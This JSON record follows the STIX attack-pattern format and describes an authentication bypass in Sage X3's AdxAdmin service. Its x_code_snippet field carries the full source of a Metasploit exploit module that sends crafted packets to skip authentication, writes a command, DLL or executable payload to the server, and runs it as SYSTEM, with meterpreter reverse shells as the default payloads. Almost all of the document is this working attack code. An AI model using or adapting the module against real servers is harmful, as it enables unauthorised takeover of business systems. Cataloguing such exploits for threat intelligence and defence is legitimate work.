{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--422126bc-b695-4e39-8c82-8a2842678918",
    "created": "2024-08-14T16:48:05.459139Z",
    "modified": "2024-08-14T16:48:05.459143Z",
    "name": "Sage X3 Administration Service Authentication Bypass Command Execution",
    "description": " This module leverages an authentication bypass exploit within Sage X3 AdxSrv's administration protocol to execute arbitrary commands as SYSTEM against a Sage X3 Server running an available AdxAdmin service. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/sage/x3_adxsrv_auth_bypass_cmd_exec.rb",
            "external_id": "x3_adxsrv_auth_bypass_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Sage X3 Administration Service Authentication Bypass Command Execution',\n        'Description' => %q{\n          This module leverages an authentication bypass exploit within Sage X3 AdxSrv's administration\n          protocol to execute arbitrary commands as SYSTEM against a Sage X3 Server running an\n          available AdxAdmin service.\n        },\n        'Author' => [\n          'Jonathan Peterson <deadjakk[at]shell.rip>', # @deadjakk\n          'Aaron Herndon' # @ac3lives\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2021-07-07',\n        'References' => [\n          ['CVE', '2020-7387'], # Infoleak\n          ['CVE', '2020-7388'], # RCE\n          ['URL', 'https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/']\n        ],\n        'Privileged' => true,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/generic',\n                'CMD' => 'whoami'\n              }\n            }\n          ],\n          [\n            'Windows DLL',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Executable',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [FIRST_ATTEMPT_FAIL],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(1818)\n      ]\n    )\n  end\n\n  def vprint(msg = '')\n    print(msg) if datastore['VERBOSE']\n  end\n\n  def check\n    s = connect\n    print_status('Connected')\n\n    # ADXDIR command authentication header\n    # allows for unauthenticated retrieval of X3 directory\n    auth_packet = \"\\x09\\x00\"\n    s.write(auth_packet)\n\n    # recv response\n    res = s.read(1024)\n\n    if res.nil? || res.length != 4\n      print_bad('ADXDIR authentication failed')\n      return CheckCode::Safe\n    end\n\n    if res.chars == [\"\\xFF\", \"\\xFF\", \"\\xFF\", \"\\xFF\"]\n      print_bad('ADXDIR authentication failed')\n      return CheckCode::Safe\n    end\n\n    print_good('ADXDIR authentication successful.')\n\n    # ADXDIR command\n    adx_dir_msg = \"\\x07\\x41\\x44\\x58\\x44\\x49\\x52\\x00\"\n    s.write(adx_dir_msg)\n    directory = s.read(1024)\n\n    return CheckCode::Safe if directory.nil?\n\n    sagedir = directory[4..-2]\n    print_good(format('Received directory info from host: %s', sagedir))\n    disconnect\n\n    CheckCode::Vulnerable(details: { sagedir: sagedir })\n  rescue Rex::ConnectionError\n    CheckCode::Unknown\n  end\n\n  def build_buffer(head, sage_payload, tail)\n    buffer = ''\n\n    # do things\n    buffer << head if head\n    buffer << sage_payload.length\n    buffer << sage_payload\n    buffer << tail if tail\n\n    buffer\n  end\n\n  def write_file(sock, filenum, sage_payload, target, sagedir)\n    s = sock\n\n    # building the initial authentication packet\n    # [2bytes][userlen 1 byte][username][userlen 1 byte][username][passlen 1 byte][CRYPT:HASH]\n    # Note: the first byte of this auth packet is different from the ADXDIR command\n\n    revsagedir = sagedir.gsub('\\\\', '/')\n\n    s.write(\"\\x06\\x00\")\n    auth_resp = s.read(1024)\n\n    fail_with(Failure::UnexpectedReply, 'Directory message did not provide intended response') if auth_resp.length != 4\n\n    print_good('Command authentication successful.')\n\n    # May require additional information such as file path\n    # this will be used for multiple messages\n\n    head = \"\\x00\\x00\\x36\\x02\\x00\\x2e\\x00\" # head\n    fmt = '@%s/tmp/cmd%s$cmd'\n    fmt = '@%s/tmp/cmd%s.dll' if target == 'Windows DLL'\n    fmt = '@%s/tmp/cmd%s.exe' if target == 'Windows Executable'\n    pload = format(fmt, revsagedir, filenum)\n    tail = \"\\x00\\x03\\x00\\x01\\x77\"\n    sendbuf = build_buffer(head, pload, tail)\n    s.write(sendbuf)\n    s.read(1024)\n\n    # Packet --- 3\n    # Creating the packet that contains the command to run\n    head = \"\\x02\\x00\\x05\\x08\\x00\\x00\\x00\"\n\n    # this writes the data to the .cmd file to get executed\n    # a single write can't be larger than ~250 bytes\n    # so writes larger than 250 need to be broken up\n    written = 0\n    print_status('Writing data')\n\n    while written < sage_payload.length\n      vprint('.')\n\n      towrite = sage_payload[written..written + 250]\n      sendbuf = build_buffer(head, towrite, nil)\n      s.write(sendbuf)\n      s.recv(1024)\n\n      written += towrite.length\n    end\n\n    vprint(\"\\r\\n\")\n  end\n\n  def exploit\n    sage_payload = payload.encoded if target.name == 'Windows Command'\n    sage_payload = generate_payload_dll if target.name == 'Windows DLL'\n    sage_payload = generate_payload_exe if target.name == 'Windows Executable'\n\n    sagedir = check.details[:sagedir]\n\n    if sagedir.nil?\n      fail_with(Failure::NotVulnerable,\n                'No directory was returned by the remote host, may not be vulnerable')\n    end\n\n    if sagedir.end_with?('AdxAdmin')\n      register_dir_for_cleanup(\"#{sagedir}\\\\tmp\")\n    end\n\n    revsagedir = sagedir.gsub('\\\\', '/')\n\n    filenum = rand_text_numeric(8)\n    vprint_status(format('Using generated filename: %s', filenum))\n\n    s = connect\n\n    write_file(s, filenum, sage_payload, target.name, sagedir)\n\n    unless target.name == 'Windows Command'\n      disconnect\n      # re-establish connection after writing file\n      s = connect\n    end\n\n    if target.name == 'Windows DLL'\n      sage_payload = \"rundll32.exe #{sagedir}\\\\tmp\\\\cmd#{filenum}.dll,0\"\n      vprint_status(sage_payload)\n      write_file(s, filenum, sage_payload, nil, sagedir)\n    end\n\n    if target.name == 'Windows Executable'\n      sage_payload = \"#{sagedir}\\\\tmp\\\\cmd#{filenum}.exe\"\n      vprint_status(sage_payload)\n      write_file(s, filenum, sage_payload, nil, sagedir)\n    end\n\n    # Some sort of delimiter\n    delim0 = \"\\x02\\x00\\x01\\x01\" # bufm\n    s.write(delim0)\n    s.recv(1024)\n\n    # Packet --- 4\n    sage_payload = \"@#{revsagedir}/tmp/sess#{filenum}$cmd\"\n    head = \"\\x00\\x00\\x37\\x02\\x00\\x2f\\x00\"\n    tail = \"\\x00\\x03\\x00\\x01\\x77\"\n    sendbuf = build_buffer(head, sage_payload, tail)\n    s.write(sendbuf)\n    s.recv(1024)\n\n    # Packet --- 5\n    head = \"\\x02\\x00\\x05\\x08\\x00\\x00\\x00\"\n    sage_payload = \"@echo off\\r\\n#{sagedir}\\\\tmp\\\\cmd#{filenum}.cmd 1>#{sagedir}\\\\tmp\\\\#{filenum}.out 2>#{sagedir}\\\\tmp\\\\#{filenum}.err\\r\\n@echo on\"\n    sendbuf = build_buffer(head, sage_payload, nil)\n    s.write(sendbuf)\n    s.recv(1024)\n\n    # Packet --- Delim\n    s.write(delim0)\n    s.recv(1024)\n\n    # Packet --- 6\n    head = \"\\x00\\x00\\x36\\x04\\x00\\x2e\\x00\"\n    sage_payload = \"#{revsagedir}\\\\tmp\\\\sess#{filenum}.cmd\"\n    tail = \"\\x00\\x03\\x00\\x01\\x72\"\n    sendbuf = build_buffer(head, sage_payload, tail)\n    s.write(sendbuf)\n    s.recv(1024)\n\n    # if it's not COMMAND, we can stop here\n    # otherwise, we'll send/recv the last bit\n    # of info for the output\n    unless target.name == 'Windows Command'\n      disconnect\n      return\n    end\n\n    # Packet --- Delim\n    delim1 = \"\\x02\\x00\\x05\\x05\\x00\\x00\\x10\\x00\"\n    s.write(delim1)\n    s.recv(1024)\n\n    # Packet --- Delim\n    s.write(delim0)\n    s.recv(1024)\n\n    # The two below are directing the server to read from the .out file that should have been created\n    # Then we get the output back\n    # Packet --- 7 - Still works when removed.\n    head = \"\\x00\\x00\\x2f\\x07\\x08\\x00\\x2b\\x00\"\n    sage_payload = \"@#{revsagedir}/tmp/#{filenum}$out\"\n    sendbuf = build_buffer(head, sage_payload, nil)\n    s.write(sendbuf)\n    s.recv(1024)\n\n    # Packet --- 8\n    head = \"\\x00\\x00\\x33\\x02\\x00\\x2b\\x00\"\n    sage_payload = \"@#{revsagedir}/tmp/#{filenum}$out\"\n    tail = \"\\x00\\x03\\x00\\x01\\x72\"\n    sendbuf = build_buffer(head, sage_payload, tail)\n    s.write(sendbuf)\n    s.recv(1024)\n\n    s.write(delim1)\n    returned_data = s.recv(8096).strip!\n\n    if returned_data.nil? || returned_data.empty?\n      disconnect\n      fail_with(Failure::PayloadFailed, 'No data appeared to be returned, try again')\n    end\n\n    print_good('------------ Response Received ------------')\n    print_status(returned_data)\n    disconnect\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-07-07",
    "x_mitre_platforms": [
        "win'"
    ]
}